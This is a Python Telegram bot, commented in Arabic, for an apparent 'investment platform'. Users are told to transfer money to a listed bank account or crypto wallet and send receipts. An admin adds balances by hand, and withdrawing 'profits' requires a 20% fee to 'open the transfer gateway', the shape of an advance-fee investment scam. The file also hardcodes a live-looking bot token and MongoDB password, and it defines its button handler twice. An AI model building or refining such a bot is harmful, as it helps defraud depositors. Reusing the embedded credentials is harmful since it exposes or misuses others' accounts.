import logging
import os
import urllib.parse
from flask import Flask
from threading import Thread
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 🌐 خادم الويب (إجباري لاستقرار البوت على Render ومنع تعليق /start) ---
server = Flask('')
@server.route('/')
def home(): return "🚀 Sahm Platform is Online"

def run_server():
    server.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

# إعداد السجلات
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= [ ⚙️ إعدادات الإمبراطور ] =================
TOKEN = '8731999916:AAHdeigVSmil8KD6GeA7OazVZkjVxhq9QJU'
ADMIN_USERNAME = 'HCICICVICIF9'
ADMINS_LIST = [6016547718]

# تشفير بيانات المونغو لضمان قبول كلمة المرور
u = urllib.parse.quote_plus('Abduh')
p = urllib.parse.quote_plus('Abduh2026')
# الرابط المطور الذي يفتح القفل فوراً
MONGO_URI = f"mongodb+srv://{u}:{p}@cluster0.0a4wefx.mongodb.net/investment_platform?authSource=admin&retryWrites=true&w=majority"

BANK_ACCOUNT = "SA0000000000000000000000"
CRYPTO_WALLET = "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA"

PRICES_SAR = ["1000", "1500", "2000", "3000", "5000", "7000", "8000", "10000", "15000", "20000", "30000", "50000"]
PRICES_USD = ["300", "400", "500", "600", "800", "1000", "2000", "3000", "5000", "20000", "30000"]
# ===============================================================

# الاتصال بالقاعدة
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client['investment_platform']
    users_col = db['users']
    client.admin.command('ping')
    logger.info("✅ تم الاتصال بسحابة MongoDB بنجاح")
except Exception as e:
    logger.error(f"❌ فشل الاتصال بالمونغو: {e}")

def get_user_data(uid):
    user = users_col.find_one({"uid": uid})
    if not user:
        user = {"uid": uid, "bal_sar": 0.0, "bal_usd": 0.0}
        users_col.insert_one(user)
    return user

def update_balance(uid, curr, amt):
    field = "bal_sar" if curr == "sr" else "bal_usd"
    users_col.update_one({"uid": uid}, {"$inc": {field: float(amt)}})

# --- 🏠 واجهة المستخدم ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    # محاولة جلب البيانات، وإذا فشل المونغو يكمل البوت ولا يتوقف
    try:
        get_user_data(user.id)
    except Exception as e:
        logger.error(f"⚠️ خطأ في المونغو ولكن سنستمر: {e}")

    keyboard = [
        [InlineKeyboardButton("🇸🇦 استثمار (بالريال السعودي)", callback_data='c_sr'),
         InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
        [InlineKeyboardButton("💰 محفظتي المالية", callback_data='wallet')],
        [InlineKeyboardButton("📤 طلب سحب الأرباح", callback_data='withdraw')],
        [InlineKeyboardButton("💬 التواصل مع الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]

    text = f"🏦 **المنصة العالمية للاستثمار**\n\nمرحباً بك سيد {user.first_name}\nاختر القسم المطلوب للبدء:"

    # التأكد من الرد
    if update.message:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    uid = query.from_user.id
    await query.answer()

    if data == 'main': await start(update, context)
    elif data == 'wallet':
        u = get_user_data(uid)
        text = f"📊 **تفاصيل محفظتك:**\n\n🇸🇦 ريال: `{u['bal_sar']:,}`\n🇺🇸 دولار: `{u['bal_usd']:,}`"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
    elif data == 'withdraw':
        u = get_user_data(uid)
        msg = f"📤 **إجراءات سحب الأرباح:**\n\n🇸🇦 رصيدك: `{u['bal_sar']:,}` ريال\n🇺🇸 رصيدك: `{u['bal_usd']:,}` دولار\n\n💡 الرسوم (20%) لفتح بوابة التحويل الدولي."
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
    elif data in ['c_sr', 'c_us']:
        curr = 'sr' if data == 'c_sr' else 'us'
        prices = PRICES_SAR if curr == 'sr' else PRICES_USD
        btns = [[InlineKeyboardButton(f"{p} {'ريال' if curr=='sr' else '$'}", callback_data=f"{curr[0]}_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
        await query.edit_message_text(f"🏦 اختر مبلغ الاستثمار:", reply_markup=InlineKeyboardMarkup(btns))
    elif data.startswith(('s_', 'u_')):
        amt = data.split('_')[1]
        addr = BANK_ACCOUNT if data.startswith('s_') else CRYPTO_WALLET
        await query.edit_message_text(f"✅ تم اختيار {amt}\nحول إلى:\n`{addr}`\n\n📸 أرسل الإيصال هنا.", parse_mode='Markdown')
    elif data.startswith(('ok_', 'no_')):
        if uid not in ADMINS_LIST: return
        if data.startswith('ok_'):
            _, c, a, target = data.split('_')
            update_balance(int(target), c, float(a))
            await query.edit_message_caption(caption=f"✅ تم تأكيد الإيداع بمبلغ {a} {c}")
            try: await context.bot.send_message(chat_id=int(target), text=f"🎉 تم إيداع `{a}` {c} في محفظتك بنجاح!")
            except: pass
        elif data.startswith('no_'):
            t = data.split('_')[1]
            await query.edit_message_caption(caption="❌ تم رفض الإيصال من قبل الإدارة.")
            try: await context.bot.send_message(chat_id=int(t), text=" ❌ تم رفض الإيصال من قبل الإدارة.")
            except: pass

# --- دالة معالجة الأزرار (إصلاح أزرار المالك) ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    uid = query.from_user.id
    await query.answer()

    if data == 'main':
        await start(update, context)
    elif data == 'wallet':
        u = get_user_data(uid)
        text = f"📊 **تفاصيل محفظتك:**\n\n🇸🇦 ريال: `{u['bal_sar']:,}`\n🇺🇸 دولار: `{u['bal_usd']:,}`"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
    elif data == 'withdraw':
        u = get_user_data(uid)
        msg = f"📤 **إجراءات سحب الأرباح:**\n\n🇸🇦 رصيدك: `{u['bal_sar']:,}` ريال\n🇺🇸 رصيدك: `{u['bal_usd']:,}` دولار\n\n💡 الرسوم (20%) لفتح بوابة التحويل الدولي."
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
    elif data in ['c_sr', 'c_us']:
        curr = 'sr' if data == 'c_sr' else 'us'
        prices = PRICES_SAR if curr == 'sr' else PRICES_USD
        btns = [[InlineKeyboardButton(f"{p} {'ريال' if curr=='sr' else '$'}", callback_data=f"{curr[0]}_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
        await query.edit_message_text(f"🏦 اختر مبلغ الاستثمار:", reply_markup=InlineKeyboardMarkup(btns))
    elif data.startswith(('s_', 'u_')):
        amt = data.split('_')[1]
        addr = BANK_ACCOUNT if data.startswith('s_') else CRYPTO_WALLET
        await query.edit_message_text(f"✅ تم اختيار {amt}\nحول إلى:\n`{addr}`\n\n📸 أرسل الإيصال هنا.", parse_mode='Markdown')
    
    # --- إصلاح أزرار المالك (التأكيد والرفض) ---
    elif data.startswith('ok_'):
        if uid not in ADMINS_LIST: return
        # تقسيم البيانات: ok, العملة, المبلغ, ايدي المستخدم
        _, curr, amt, target_id = data.split('_')
        try:
            update_balance(int(target_id), curr, float(amt))
            await query.edit_message_caption(caption=f"✅ تم تأكيد الإيداع بمبلغ {amt} {curr}\nتمت الإضافة للمحفظة.")
            await context.bot.send_message(chat_id=int(target_id), text=f"🎉 تم إيداع `{amt}` {curr} في محفظتك بنجاح!")
        except Exception as e:
            logger.error(f"خطأ في إضافة الرصيد: {e}")
            await query.answer("❌ حدث خطأ أثناء إضافة الرصيد")

    elif data.startswith('no_'):
        if uid not in ADMINS_LIST: return
        target_id = data.split('_')[1]
        await query.edit_message_caption(caption="❌ تم رفض هذا الإيصال.")
        try:
            await context.bot.send_message(chat_id=int(target_id), text="❌ تم رفض الإيصال من قبل الإدارة.")
        except: pass

# --- دالة استقبال الصور (أزرار المالك الكاملة) ---
async def handle_receipt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        user = update.effective_user
        await update.message.reply_text("✅ تم استلام الإيصال، جاري المراجعة...")
        
        # دالة مساعدة لصنع الأزرار بنفس مبالغ الكود الأصلي
        def b(v, c): return InlineKeyboardButton(f"➕ {v} {('﷼' if c=='sr' else '$')}", callback_data=f"ok_{c}_{v}_{user.id}")
        
        kb = [
            [b("1000", "sr"), b("1500", "sr")],
            [b("2000", "sr"), b("3000", "sr")],
            [b("5000", "sr"), b("10000", "sr")],
            [b("300", "us"), b("500", "us")],
            [b("1000", "us"), b("5000", "us")],
            [InlineKeyboardButton("❌ رفض الإيصال", callback_data=f"no_{user.id}")]
        ]
        
        for adm in ADMINS_LIST:
            try:
                await context.bot.send_photo(chat_id=adm, photo=update.message.photo[-1].file_id, 
                                           caption=f"🔔 إيداع جديد من: {user.first_name}\nID: `{user.id}`", 
                                           reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
            except: pass

if __name__ == '__main__':
    # 1. تشغيل السيرفر في الخلفية
    Thread(target=run_server, daemon=True).start()
    
    # 2. بناء التطبيق
    app = Application.builder().token(TOKEN).concurrent_updates(True).build()
    
    # 3. --- الترتيب هو السر ---
    # يجب وضع CommandHandler في أول القائمة دائماً
    app.add_handler(CommandHandler('start', start))
    
    # ثم معالج الأزرار
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # ثم معالج الصور (هذا الذي كان يسبب الانسداد)
    app.add_handler(MessageHandler(filters.PHOTO, handle_receipt))
    
    # حل الطوارئ: إذا أرسل المستخدم كلمة "ستارت" أو "start" كرسالة وليس كأمر
    app.add_handler(MessageHandler(filters.TEXT & (filters.Regex(r'(?i)^/start$') | filters.Regex(r'^start$')), start))

    logger.info("🚀 تم إصلاح مسار دالة ستارت.. الانطلاق الآن")
    
    # 4. تنظيف الرسائل القديمة العالقة لضمان الاستجابة الفورية
    app.run_polling(drop_pending_updates=True)
